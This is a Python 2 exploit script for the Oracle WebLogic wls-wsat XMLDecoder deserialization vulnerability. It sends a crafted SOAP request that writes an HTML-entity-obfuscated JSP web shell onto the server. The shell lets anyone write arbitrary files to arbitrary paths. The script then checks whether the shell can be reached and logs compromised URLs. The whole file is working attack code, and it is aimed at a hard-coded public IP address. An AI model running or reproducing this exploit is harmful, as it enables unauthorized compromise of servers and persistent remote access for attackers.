#coding:utf-8
import requests
import threading
import time
import Queue

shell_path_list = ['bea_wls_internal/9j4dqk/war/wgic1.jsp','wls-wsat/54p17w/war/wgic1.jsp']
#shell_content = '201710271'
shell_content = '''201710271
&#60;&#37;&#64;&#112;&#97;&#103;&#101;&#32;&#99;&#111;&#110;&#116;&#101;&#110;&#116;&#84;&#121;&#112;&#101;&#61;&#34;&#116;&#101;&#120;&#116;&#47;&#104;&#116;&#109;&#108;&#59;&#32;&#99;&#104;&#97;&#114;&#115;&#101;&#116;&#61;&#71;&#66;&#50;&#51;&#49;&#50;&#34;&#32;&#105;&#109;&#112;&#111;&#114;&#116;&#61;&#34;&#106;&#97;&#118;&#97;&#46;&#105;&#111;&#46;&#42;&#59;&#34;&#37;&#62;&#10;&#10;&#60;&#104;&#116;&#109;&#108;&#62;&#10;&#10;&#60;&#104;&#101;&#97;&#100;&#62;&#10;&#10;&#60;&#116;&#105;&#116;&#108;&#101;&#62;&#74;&#83;&#80;&#23567;&#39532;&#60;&#47;&#116;&#105;&#116;&#108;&#101;&#62;&#10;&#10;&#60;&#47;&#104;&#101;&#97;&#100;&#62;&#10;&#10;&#60;&#98;&#111;&#100;&#121;&#32;&#98;&#103;&#99;&#111;&#108;&#111;&#114;&#61;&#34;&#35;&#102;&#102;&#102;&#102;&#102;&#102;&#34;&#62;&#10;&#10;&#60;&#37;&#10;&#10;&#83;&#116;&#114;&#105;&#110;&#103;&#32;&#112;&#97;&#116;&#104;&#61;&#114;&#101;&#113;&#117;&#101;&#115;&#116;&#46;&#103;&#101;&#116;&#80;&#97;&#114;&#97;&#109;&#101;&#116;&#101;&#114;&#40;&#34;&#112;&#97;&#116;&#104;&#34;&#41;&#59;&#10;&#10;&#83;&#116;&#114;&#105;&#110;&#103;&#32;&#99;&#111;&#110;&#116;&#101;&#110;&#116;&#61;&#114;&#101;&#113;&#117;&#101;&#115;&#116;&#46;&#103;&#101;&#116;&#80;&#97;&#114;&#97;&#109;&#101;&#116;&#101;&#114;&#40;&#34;&#99;&#111;&#110;&#116;&#101;&#110;&#116;&#34;&#41;&#59;&#10;&#10;&#83;&#116;&#114;&#105;&#110;&#103;&#32;&#117;&#114;&#108;&#61;&#114;&#101;&#113;&#117;&#101;&#115;&#116;&#46;&#103;&#101;&#116;&#82;&#101;&#113;&#117;&#101;&#115;&#116;&#85;&#82;&#73;&#40;&#41;&#59;&#10;&#10;&#83;&#116;&#114;&#105;&#110;&#103;&#32;&#114;&#101;&#108;&#97;&#116;&#105;&#118;&#101;&#117;&#114;&#108;&#61;&#117;&#114;&#108;&#46;&#115;&#117;&#98;&#115;&#116;&#114;&#105;&#110;&#103;&#40;&#117;&#114;&#108;&#46;&#105;&#110;&#100;&#101;&#120;&#79;&#102;&#40;&#39;&#47;&#39;&#44;&#49;&#41;&#41;&#59;&#10;&#10;&#83;&#116;&#114;&#105;&#110;&#103;&#32;&#97;&#98;&#115;&#111;&#108;&#117;&#116;&#101;&#112;&#97;&#116;&#104;&#61;&#97;&#112;&#112;&#108;&#105;&#99;&#97;&#116;&#105;&#111;&#110;&#46;&#103;&#101;&#116;&#82;&#101;&#97;&#108;&#80;&#97;&#116;&#104;&#40;&#114;&#101;&#108;&#97;&#116;&#105;&#118;&#101;&#117;&#114;&#108;&#41;&#59;&#10;&#10;&#105;&#102;&#32;&#40;&#112;&#97;&#116;&#104;&#33;&#61;&#110;&#117;&#108;&#108;&#32;&#38;&#38;&#32;&#33;&#112;&#97;&#116;&#104;&#46;&#101;&#113;&#117;&#97;&#108;&#115;&#40;&#34;&#34;&#41;&#32;&#38;&#38;&#32;&#99;&#111;&#110;&#116;&#101;&#110;&#116;&#33;&#61;&#110;&#117;&#108;&#108;&#32;&#38;&#38;&#32;&#33;&#99;&#111;&#110;&#116;&#101;&#110;&#116;&#46;&#101;&#113;&#117;&#97;&#108;&#115;&#40;&#34;&#34;&#41;&#41;&#10;&#10;&#123;&#10;&#10;&#32;&#32;&#116;&#114;&#121;&#123;&#10;&#10;&#32;&#32;&#32;&#32;&#70;&#105;&#108;&#101;&#32;&#110;&#101;&#119;&#102;&#105;&#108;&#101;&#61;&#110;&#101;&#119;&#32;&#70;&#105;&#108;&#101;&#40;&#112;&#97;&#116;&#104;&#41;&#59;&#10;&#10;&#32;&#32;&#32;&#32;&#80;&#114;&#105;&#110;&#116;&#87;&#114;&#105;&#116;&#101;&#114;&#32;&#119;&#114;&#105;&#116;&#101;&#114;&#61;&#110;&#101;&#119;&#32;&#80;&#114;&#105;&#110;&#116;&#87;&#114;&#105;&#116;&#101;&#114;&#40;&#110;&#101;&#119;&#102;&#105;&#108;&#101;&#41;&#59;&#10;&#10;&#32;&#32;&#32;&#32;&#119;&#114;&#105;&#116;&#101;&#114;&#46;&#112;&#114;&#105;&#110;&#116;&#108;&#110;&#40;&#99;&#111;&#110;&#116;&#101;&#110;&#116;&#41;&#59;&#10;&#10;&#32;&#32;&#32;&#32;&#119;&#114;&#105;&#116;&#101;&#114;&#46;&#99;&#108;&#111;&#115;&#101;&#40;&#41;&#59;&#10;&#10;&#32;&#32;&#32;&#32;&#105;&#102;&#32;&#40;&#110;&#101;&#119;&#102;&#105;&#108;&#101;&#46;&#101;&#120;&#105;&#115;&#116;&#115;&#40;&#41;&#32;&#38;&#38;&#32;&#110;&#101;&#119;&#102;&#105;&#108;&#101;&#46;&#108;&#101;&#110;&#103;&#116;&#104;&#40;&#41;&#62;&#48;&#41;&#10;&#10;&#32;&#32;&#32;&#32;&#123;&#10;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#111;&#117;&#116;&#46;&#112;&#114;&#105;&#110;&#116;&#108;&#110;&#40;&#34;&#60;&#102;&#111;&#110;&#116;&#32;&#115;&#105;&#122;&#101;&#61;&#51;&#32;&#99;&#111;&#108;&#111;&#114;&#61;&#114;&#101;&#100;&#62;&#20445;&#23384;&#25104;&#21151;&#33;&#60;&#47;&#102;&#111;&#110;&#116;&#62;&#34;&#41;&#59;&#10;&#10;&#32;&#32;&#32;&#32;&#125;&#101;&#108;&#115;&#101;&#123;&#10;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#111;&#117;&#116;&#46;&#112;&#114;&#105;&#110;&#116;&#108;&#110;&#40;&#34;&#60;&#102;&#111;&#110;&#116;&#32;&#115;&#105;&#122;&#101;&#61;&#51;&#32;&#99;&#111;&#108;&#111;&#114;&#61;&#114;&#101;&#100;&#62;&#20445;&#23384;&#22833;&#36133;&#33;&#60;&#47;&#102;&#111;&#110;&#116;&#62;&#34;&#41;&#59;&#10;&#10;&#32;&#32;&#32;&#32;&#125;&#10;&#10;&#32;&#32;&#125;&#99;&#97;&#116;&#99;&#104;&#40;&#69;&#120;&#99;&#101;&#112;&#116;&#105;&#111;&#110;&#32;&#101;&#41;&#10;&#10;&#32;&#32;&#123;&#10;&#10;&#32;&#32;&#32;&#32;&#101;&#46;&#112;&#114;&#105;&#110;&#116;&#83;&#116;&#97;&#99;&#107;&#84;&#114;&#97;&#99;&#101;&#40;&#41;&#59;&#10;&#10;&#32;&#32;&#125;&#10;&#10;&#125;&#10;&#10;&#111;&#117;&#116;&#46;&#112;&#114;&#105;&#110;&#116;&#108;&#110;&#40;&#34;&#60;&#102;&#111;&#114;&#109;&#32;&#97;&#99;&#116;&#105;&#111;&#110;&#61;&#34;&#43;&#117;&#114;&#108;&#43;&#34;&#32;&#109;&#101;&#116;&#104;&#111;&#100;&#61;&#112;&#111;&#115;&#116;&#62;&#34;&#41;&#59;&#10;&#10;&#111;&#117;&#116;&#46;&#112;&#114;&#105;&#110;&#116;&#108;&#110;&#40;&#34;&#60;&#102;&#111;&#110;&#116;&#32;&#115;&#105;&#122;&#101;&#61;&#51;&#62;&#35831;&#36755;&#20837;&#20445;&#23384;&#30340;&#36335;&#24452;&#58;&#60;&#98;&#114;&#62;&#60;&#47;&#102;&#111;&#110;&#116;&#62;&#60;&#105;&#110;&#112;&#117;&#116;&#32;&#116;&#121;&#112;&#101;&#61;&#116;&#101;&#120;&#116;&#32;&#115;&#105;&#122;&#101;&#61;&#53;&#52;&#32;&#110;&#97;&#109;&#101;&#61;&#39;&#112;&#97;&#116;&#104;&#39;&#62;&#60;&#98;&#114;&#62;&#34;&#41;&#59;&#10;&#10;&#111;&#117;&#116;&#46;&#112;&#114;&#105;&#110;&#116;&#108;&#110;&#40;&#34;&#60;&#102;&#111;&#110;&#116;&#32;&#115;&#105;&#122;&#101;&#61;&#51;&#32;&#99;&#111;&#108;&#111;&#114;&#61;&#114;&#101;&#100;&#62;&#24403;&#21069;&#36335;&#24452;&#34;&#43;&#97;&#98;&#115;&#111;&#108;&#117;&#116;&#101;&#112;&#97;&#116;&#104;&#43;&#34;&#60;&#47;&#102;&#111;&#110;&#116;&#62;&#60;&#98;&#114;&#62;&#34;&#41;&#59;&#10;&#10;&#111;&#117;&#116;&#46;&#112;&#114;&#105;&#110;&#116;&#108;&#110;&#40;&#34;&#60;&#116;&#101;&#120;&#116;&#97;&#114;&#101;&#97;&#32;&#110;&#97;&#109;&#101;&#61;&#39;&#99;&#111;&#110;&#116;&#101;&#110;&#116;&#39;&#32;&#114;&#111;&#119;&#115;&#61;&#49;&#53;&#32;&#99;&#111;&#108;&#115;&#61;&#49;&#48;&#48;&#62;&#60;&#47;&#116;&#101;&#120;&#116;&#97;&#114;&#101;&#97;&#62;&#60;&#98;&#114;&#62;&#34;&#41;&#59;&#10;&#10;&#111;&#117;&#116;&#46;&#112;&#114;&#105;&#110;&#116;&#108;&#110;&#40;&#34;&#60;&#105;&#110;&#112;&#117;&#116;&#32;&#116;&#121;&#112;&#101;&#61;&#39;&#115;&#117;&#98;&#109;&#105;&#116;&#39;&#32;&#118;&#97;&#108;&#117;&#101;&#61;&#39;&#20445;&#23384;&#33;&#39;&#62;&#34;&#41;&#59;&#10;&#10;&#111;&#117;&#116;&#46;&#112;&#114;&#105;&#110;&#116;&#108;&#110;&#40;&#34;&#60;&#47;&#102;&#111;&#114;&#109;&#62;&#34;&#41;&#59;&#10;&#10;&#37;&#62;&#10;&#10;&#60;&#47;&#98;&#111;&#100;&#121;&#62;&#10;&#10;&#60;&#47;&#104;&#116;&#109;&#108;&#62;&#10;
                '''
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110',
           'Content-Type':'text/xml'
    }

#url = 'http://129.144.21.121:7001'

def verify(url):
    for shell_path in shell_path_list:
        try:
            #print shell_path
            data = '''
                <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
                <java><java version="1.4.0" class="java.beans.XMLDecoder">
                <void class="java.io.PrintWriter">
                <string>servers/AdminServer/tmp/_WL_internal/'''+ shell_path + '''</string><void method="println"><string>'''+ shell_content +'''</string>
                </void><void method="close"/></void></java></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>
            '''
            url1 =  url +  '/wls-wsat/CoordinatorPortType'
            #print url1
            requests.post(url1,data=data,headers=headers,timeout=0.5)
        except:
            continue
    try:
        r1 = requests.get(url + '/bea_wls_internal/wgic1.jsp' ,headers = headers,timeout=0.5)
        r2 = requests.get(url + '/wls-wsat/wgic1.jsp' ,headers = headers,timeout=0.5)
        if '201710271' in r1.content:
            print 'Success:%s/bea_wls_internal/wgic1.jsp'%(url)
            with open('success.txt','a') as f:
                f.write(url + '/bea_wls_internal/wgic1.jsp\n')
        elif '201710271' in r2.content:
            print 'Success:%s/wls-wsat/wgic1.jsp'%(url)
            with open('success.txt','a') as f:
                f.write(url + '/wls-wsat/wgic1.jsp\n')
    except:
        pass

verify('http://221.207.246.187:80')

